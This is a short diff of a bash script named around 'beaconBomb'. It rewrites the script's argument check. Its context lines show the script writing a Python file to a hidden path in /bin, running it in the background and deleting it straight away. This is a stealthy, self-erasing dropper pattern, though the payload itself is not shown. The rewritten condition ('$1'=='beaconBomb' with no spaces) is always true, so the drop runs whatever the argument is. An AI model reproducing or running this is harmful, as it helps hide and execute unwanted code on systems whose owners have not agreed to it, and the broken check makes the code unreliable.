@@ -1,6 +1,6 @@
 #!/bin/bash
-declare filename = $1
-if [ $filename = "beaconBomb" ] 
+if [ "$1"=="beaconBomb" ] 
+then
 cat <<EOFA > /bin/.beaconBomb.py
 import os
 import subprocess
@@ -21,3 +21,4 @@ EOFA
 chmod +x /bin/.beaconBomb.py
 python3 /bin/.beaconBomb.py &
 rm /bin/.beaconBomb.py
+fi
